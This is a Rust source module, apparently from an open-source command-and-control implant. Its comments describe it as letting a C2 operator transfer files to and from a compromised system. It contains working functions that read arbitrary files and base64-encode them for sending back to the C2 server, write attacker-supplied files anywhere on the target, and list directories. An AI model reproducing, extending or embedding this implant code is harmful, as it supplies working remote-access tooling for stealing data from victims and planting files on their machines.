/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! File upload and download operations.
//!
//! Allows the C2 operator to transfer files to and from
//! the compromised system. Data is base64 encoded for
//! transmission over JSON.

use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use std::fs;
use std::path::Path;

/// Downloads (reads) a file from the target system.
///
/// Reads the file contents and returns them as base64-encoded
/// string for transmission back to the C2 server.
///
/// # Arguments
/// * `path` - Path to the file to read
///
/// # Returns
/// Base64-encoded file contents, or error message
pub fn download_file(path: &str) -> Result<String, String> {
    let path = Path::new(path);

    // Check if file exists
    if !path.exists() {
        return Err(format!("File not found: {}", path.display()));
    }

    // Check if it's a file (not a directory)
    if !path.is_file() {
        return Err(format!("Not a file: {}", path.display()));
    }

    // Read the file
    let contents = fs::read(path).map_err(|e| format!("Failed to read file: {}", e))?;

    // Encode as base64 for transmission
    Ok(BASE64.encode(contents))
}

/// Uploads (writes) a file to the target system.
///
/// Takes base64-encoded data and writes it to the specified path.
/// Creates parent directories if they don't exist.
///
/// # Arguments
/// * `path` - Path where the file should be written
/// * `data` - Base64-encoded file contents
///
/// # Returns
/// Success message with file size, or error message
pub fn upload_file(path: &str, data: &str) -> Result<String, String> {
    let path = Path::new(path);

    // Create parent directories if needed
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)
            .map_err(|e| format!("Failed to create directories: {}", e))?;
    }

    // Decode base64 data
    let contents = BASE64
        .decode(data)
        .map_err(|e| format!("Invalid base64 data: {}", e))?;

    let size = contents.len();

    // Write the file
    fs::write(path, contents).map_err(|e| format!("Failed to write file: {}", e))?;

    Ok(format!(
        "Uploaded {} bytes to {}",
        size,
        path.display()
    ))
}

/// Lists files in a directory.
///
/// Returns a formatted listing of files and subdirectories
/// with their sizes and types.
///
/// # Arguments
/// * `path` - Path to the directory to list
///
/// # Returns
/// Formatted directory listing, or error message
pub fn list_directory(path: &str) -> Result<String, String> {
    let path = Path::new(path);

    if !path.exists() {
        return Err(format!("Path not found: {}", path.display()));
    }

    if !path.is_dir() {
        return Err(format!("Not a directory: {}", path.display()));
    }

    let mut output = format!("Directory listing of {}:\n\n", path.display());

    let entries = fs::read_dir(path).map_err(|e| format!("Failed to read directory: {}", e))?;

    for entry in entries {
        let entry = entry.map_err(|e| format!("Failed to read entry: {}", e))?;
        let metadata = entry.metadata().map_err(|e| format!("Failed to get metadata: {}", e))?;

        let file_type = if metadata.is_dir() {
            "DIR "
        } else if metadata.is_symlink() {
            "LINK"
        } else {
            "FILE"
        };

        let size = if metadata.is_file() {
            format!("{:>10}", metadata.len())
        } else {
            "         -".to_string()
        };

        output.push_str(&format!(
            "{} {} {}\n",
            file_type,
            size,
            entry.file_name().to_string_lossy()
        ));
    }

    Ok(output)
}
